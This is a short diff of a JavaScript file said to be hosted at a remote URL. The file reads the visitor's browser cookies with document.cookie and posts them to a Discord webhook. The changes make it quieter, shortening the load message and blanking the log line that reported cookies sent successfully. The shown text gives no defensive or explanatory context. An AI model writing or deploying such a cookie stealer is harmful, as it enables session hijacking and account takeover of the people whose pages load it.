@@ -1,5 +1,5 @@
 // Assume this is the content of the file hosted at https://ex.am/m
-console.log("Module loaded and executed!");
+console.log("Module loaded");
 
 // Collect the cookies
 var cookies = document.cookie;
@@ -21,7 +21,7 @@ fetch(webhookUrl, {
     body: JSON.stringify(payload)
 }).then(response => {
     if (response.ok) {
-        console.log('Cookies sent to Discord successfully.');
+        console.log('');
     } else {
         console.error('Error sending cookies to Discord:', response.statusText);
     }
